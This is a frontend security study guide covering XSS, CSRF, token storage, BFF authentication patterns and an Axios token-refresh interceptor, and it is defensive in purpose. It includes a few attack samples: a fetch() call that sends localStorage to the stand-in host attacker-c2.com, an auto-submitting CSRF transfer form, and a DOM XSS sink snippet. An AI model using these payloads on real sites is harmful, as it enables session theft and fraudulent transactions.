# Frontend System Design — Day 09: Frontend Security Architecture

> **Core Philosophy**: The browser is an inherently untrusted runtime environment. Frontend security is not an isolated implementation; it is a **defense-in-depth model** designed to minimize attack surfaces, isolate state, and prevent privilege escalation.

---

## Table of Contents
1. [Threat Modeling in Modern Frontend](#1-threat-modeling-in-modern-frontend)
2. [Cross-Site Scripting (XSS) Deep Dive](#2-cross-site-scripting-xss-deep-dive)
3. [Cross-Site Request Forgery (CSRF) Deep Dive](#3-cross-site-request-forgery-csrf-deep-dive)
4. [Token Storage Architecture & Attack Mitigation](#4-token-storage-architecture--attack-mitigation)
5. [End-to-End Enterprise Authentication Flows](#5-end-to-end-enterprise-authentication-flows)
6. [Architectural Decision Matrix (BFF vs. Direct SPA)](#6-architectural-decision-matrix-bff-vs-direct-spa)
7. [Production Code Implementation: Axios Concurrent Token Refresh](#7-production-code-implementation-axios-concurrent-token-refresh)
8. [Senior Engineering Interview Talking Points](#8-senior-engineering-interview-talking-points)

---

## 1. Threat Modeling in Modern Frontend

When architecting a frontend system, assumptions about safety must follow the **Zero-Trust Model**:

```
+-------------------------------------------------------------+
| UNTRUSTED RUNTIME: User Browser                             |
|  - Injected Third-Party Scripts (Analytics, Tag Managers)   |
|  - Malicious Extensions / Compromised Dependency Tree       |
|  - Public DOM, Developer Tools, Exposed Memory              |
+-------------------------------------------------------------+
                              │
                              │ [Network Boundary]
                              ▼
+-------------------------------------------------------------+
| TRUSTED RUNTIME: BFF / API Gateway / Identity Provider       |
|  - Server Secrets, Private Keys, Database Queries           |
+-------------------------------------------------------------+
```

### Primary Risk Vectors:
* **Supply Chain Infiltration**: Malicious updates in npm packages executing code in client space.
* **Ambient Credential Abuse**: Automatic inclusion of cookies in cross-origin requests.
* **Storage Exfiltration**: Global extraction of unpartitioned browser storage (`localStorage`, `sessionStorage`, `IndexedDB`).

---

## 2. Cross-Site Scripting (XSS) Deep Dive

XSS occurs when untrusted input is interpreted as executable code by the browser's JavaScript engine.

### Attack Classifications

| Type | Mechanism | Real-Life Vector | Blast Radius |
| :--- | :--- | :--- | :--- |
| **Stored XSS** | Payload persists in database and is served to multiple users. | Comment section, user bios, review fields. | **Catastrophic**: Affects all viewing users. |
| **Reflected XSS** | Payload is reflected off the server via query params or headers. | Search bar displaying `Results for: ${query}`. | **Targeted**: Requires tricking victim into clicking a crafted URL. |
| **DOM-based XSS** | Payload is read from a DOM source and written to a DOM sink purely client-side. | `const hash = location.hash; document.getElementById('view').innerHTML = hash;` | **Direct**: Executes inside the client context without server round-trip. |

### DOM Execution Sinks to Ban
* `element.innerHTML` / `element.outerHTML`
* `document.write()` / `document.writeln()`
* `eval()` / `new Function()`
* `window.location.href = "javascript:..."`
* `dangerouslySetInnerHTML` (React) / `v-html` (Vue)

### Defense Strategies

#### 1. Input/Output Sanitization (DOMPurify)
Frameworks automatically escape strings in template bindings (`<div>{userInput}</div>`), but dynamic HTML rendering requires an active sanitizer:

```typescript
import DOMPurify from 'dompurify';

export function sanitizeHtml(rawHtml: string): string {
  return DOMPurify.sanitize(rawHtml, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li', 'code'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
    // Force rel="noopener noreferrer" on external links
    ADD_ATTR: ['target'],
    FORBID_TAGS: ['style', 'script', 'iframe', 'object', 'embed'],
    FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover']
  });
}
```

#### 2. Strict Content Security Policy (CSP)
Deliver CSP headers via the reverse proxy (Nginx/Cloudflare) or web server:

```http
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' 'nonce-EDNnf03nceIOfn39fn3e9h3sdfa';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https://cdn.yourapp.com;
  connect-src 'self' https://api.yourapp.com;
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
```
* **Nonce-based scripts**: Only scripts containing the exact server-generated cryptographic nonce will execute.
* **`frame-ancestors 'none'`**: Prevents Clickjacking by disallowing framing within `<iframe>`.

---

## 3. Cross-Site Request Forgery (CSRF) Deep Dive

CSRF exploits the browser's default behavior of automatically including cookies with every request sent to a specific domain (ambient authority).

### The Attack Vector
1. Victim authenticates to `bank.com`, receiving a session cookie.
2. Victim opens a tab to `malicious-site.com`.
3. `malicious-site.com` executes:
   ```html
   <form action="https://bank.com/api/transfer" method="POST">
     <input type="hidden" name="amount" value="50000" />
     <input type="hidden" name="recipient" value="attacker_id" />
   </form>
   <script>document.forms[0].submit();</script>
   ```
4. The browser attaches the valid `bank.com` cookie. Without CSRF safeguards, the server processes the transaction.

### Defense Mechanisms

#### A. `SameSite` Cookie Attribute
* **`SameSite=Strict`**: Cookie is never sent in cross-site requests, even when following an external link.
* **`SameSite=Lax`** (Modern Browser Default): Cookie is withheld on cross-site subrequests (images, iframes, POST forms), but sent when navigating to the origin via top-level GET links.
* **`SameSite=None; Secure`**: Required only for embedded third-party iframe contexts (requires HTTPS).

#### B. Synchronizer Token Pattern (CSRF Tokens)
For mutation requests (`POST`, `PUT`, `PATCH`, `DELETE`):
1. Server issues a cryptographically random, session-bound token.
2. Client includes the token in a custom header:
   ```http
   POST /api/transfer HTTP/1.1
   Host: bank.com
   X-CSRF-Token: d41d8cd98f00b204e9800998ecf8427e
   ```
3. Browsers enforce the Same-Origin Policy (SOP) on custom headers; cross-origin forms cannot set custom headers without explicit CORS preflight (`OPTIONS`) approval.

---

## 4. Token Storage Architecture & Attack Mitigation

| Storage Location | XSS Vulnerability | CSRF Vulnerability | Persistence Across Tabs | Architect Assessment |
| :--- | :--- | :--- | :--- | :--- |
| **`localStorage`** | **CRITICAL** (Accessible via `window.localStorage`) | **Immune** (Not sent automatically) | Persistent | ❌ **Strictly Forbidden** for sensitive auth tokens. |
| **`sessionStorage`** | **CRITICAL** (Accessible via JavaScript) | **Immune** | Single Tab Only | ❌ **Forbidden** for auth credentials. |
| **`HttpOnly` Cookie** | **PROTECTED** (Inaccessible to JS) | **Vulnerable** without `SameSite` / CSRF token | Configurable via `Max-Age` / `Expires` | ✅ **Industry Standard** for web apps. |
| **In-Memory (Closure/State)** | **PROTECTED** from offline scraping | **Immune** | Cleared on page refresh | ✅ **Ideal** for short-lived access tokens. |

### Why `localStorage` is an Architectural Anti-Pattern for Tokens
If an attacker finds a single DOM-based XSS vulnerability or compromises a single nested dependency in `node_modules`, they can execute:
```javascript
fetch('https://attacker-c2.com/log', {
  method: 'POST',
  body: JSON.stringify(localStorage)
});
```
This extracts all user sessions globally. With `HttpOnly` cookies, the attacker can only make requests *through* the user's active session, which is bounded by CSP, network timeouts, and monitoring.

---

## 5. End-to-End Enterprise Authentication Flows

### Architecture Pattern 1: Backend-for-Frontend (BFF) Pattern (Recommended)

```
[ Browser / Single Page App ]
            │
            │ Encrypted SameSite Session Cookie
            ▼
[ Next.js / Node.js BFF Proxy Layer ]
      │                            │
      │ Stores Access/Refresh Token│ Secure Credential Storage
      ▼                            ▼
[ OAuth 2.0 / IdP ]        [ Core Resource APIs ]
(Auth0 / Okta / Keycloak)  (Bearer Token attached by BFF)
```

1. **SPA to BFF**: Communicates exclusively using an encrypted, `HttpOnly`, `SameSite=Strict`, `Secure` session cookie.
2. **BFF to Microservices**: The BFF translates the session cookie into a valid `Authorization: Bearer <access_token>` header.
3. **Secret Isolation**: Client secrets and raw refresh tokens never touch client runtime memory.

---

### Architecture Pattern 2: In-Memory Access Token + HttpOnly Refresh Token

Used when a BFF is not viable and the SPA directly interfaces with resource APIs.

```
       Browser Client                              Auth Server
             │                                          │
             │─── 1. POST /login (credentials) ────────>│
             │<── 2. JSON: { accessToken (5 min) } ─────│
             │       Set-Cookie: refreshToken; HttpOnly─│
             │                                          │
     [Store token in JS memory]                         │
             │                                          │
             │─── 3. GET /api/data (Bearer Token) ─────>│
             │<── 4. 401 Unauthorized (Expired) ────────│
             │                                          │
    [Enqueue pending requests]                          │
             │─── 5. POST /auth/refresh (Cookie sent) ─>│
             │<── 6. JSON: { new accessToken } ─────────│
             │                                          │
    [Drain queue & retry requests]                      │
```

---

## 6. Architectural Decision Matrix (BFF vs. Direct SPA)

| Parameter | BFF Pattern | In-Memory + Silent Refresh |
| :--- | :--- | :--- |
| **Complexity** | High (Requires dedicated server runtime) | Moderate (Client interceptors only) |
| **Attack Surface** | Minimal (Zero token exposure to JS) | Low (Token exposed only in JS memory) |
| **SSR Compatibility** | Native (Server components share session) | Poor (Requires hydration handshakes) |
| **CORS Overhead** | None (Same-origin routing) | Requires fine-grained preflight handling |
| **Recommended For** | Financial services, healthcare, enterprise SaaS | High-scale client-heavy SPAs, decoupled teams |

---

## 7. Production Code Implementation: Axios Concurrent Token Refresh

```typescript
import axios, {
  AxiosError,
  AxiosInstance,
  InternalAxiosRequestConfig
} from 'axios';

interface FailedRequestPromise {
  resolve: (token: string) => void;
  reject: (error: unknown) => void;
}

// In-Memory Token Reference (Scoped within Module Closure)
let inMemoryAccessToken: string | null = null;
let isRefreshing = false;
let failedQueue: FailedRequestPromise[] = [];

const processQueue = (error: unknown, token: string | null = null) => {
  failedQueue.forEach((promise) => {
    if (error) {
      promise.reject(error);
    } else if (token) {
      promise.resolve(token);
    }
  });
  failedQueue = [];
};

export const setAccessToken = (token: string | null): void => {
  inMemoryAccessToken = token;
};

export const api: AxiosInstance = axios.create({
  baseURL: process.env.NEXT_PUBLIC_API_URL || '/api',
  withCredentials: true // Mandatory: ensures HttpOnly refresh cookie is sent
});

// Request Interceptor: Attach in-memory token
api.interceptors.request.use(
  (config: InternalAxiosRequestConfig) => {
    if (inMemoryAccessToken && config.headers) {
      config.headers.Authorization = `Bearer ${inMemoryAccessToken}`;
    }
    return config;
  },
  (error) => Promise.reject(error)
);

// Response Interceptor: Handle 401 & Concurrent Refresh Queue
api.interceptors.response.use(
  (response) => response,
  async (error: AxiosError) => {
    const originalRequest = error.config as InternalAxiosRequestConfig & {
      _retry?: boolean;
    };

    if (error.response?.status === 401 && !originalRequest._retry) {
      // If a refresh is already in flight, queue this request
      if (isRefreshing) {
        return new Promise<string>((resolve, reject) => {
          failedQueue.push({ resolve, reject });
        })
          .then((token) => {
            originalRequest.headers.Authorization = `Bearer ${token}`;
            return api(originalRequest);
          })
          .catch((err) => Promise.reject(err));
      }

      originalRequest._retry = true;
      isRefreshing = true;

      try {
        // Trigger token refresh endpoint; refreshToken is sent automatically via HttpOnly cookie
        const { data } = await axios.post<{ accessToken: string }>(
          '/api/auth/refresh',
          {},
          { withCredentials: true }
        );

        const newAccessToken = data.accessToken;
        setAccessToken(newAccessToken);
        processQueue(null, newAccessToken);

        originalRequest.headers.Authorization = `Bearer ${newAccessToken}`;
        return api(originalRequest);
      } catch (refreshError) {
        processQueue(refreshError, null);
        setAccessToken(null);

        // Broadcast session expiration across tabs
        if (typeof window !== 'undefined') {
          window.dispatchEvent(new Event('auth:session-expired'));
          window.location.href = '/login?session_expired=true';
        }
        return Promise.reject(refreshError);
      } finally {
        isRefreshing = false;
      }
    }

    return Promise.reject(error);
  }
);
```

---

## 8. Senior Engineering Interview Talking Points

1. **"Never rely on a single defensive layer."**
   * *Talking Point*: React escapes inputs by default, but a robust architecture pairs DOM escaping with strict sanitization (`DOMPurify`), execution sink bans, and a Nonce-based CSP header.

2. **"LocalStorage is not built for security."**
   * *Talking Point*: `localStorage` has no access-control boundaries; any script running on the page can inspect it. Sensitive tokens belong in `HttpOnly`, `SameSite=Strict` cookies or transient memory closures.

3. **"Address race conditions during token expiration."**
   * *Talking Point*: When an access token expires, multiple parallel requests will hit `401` simultaneously. Without a subscriber queue, this triggers a thundering herd against `/auth/refresh`, invalidating refresh tokens through concurrent reuse detection.

4. **"Differentiate between AuthN and AuthZ on the client."**
   * *Talking Point*: Client-side role checks (`isAdmin ? <AdminPanel /> : null`) are UX optimizations, not security controls. True authorization enforcement is always handled by backend authorization policies.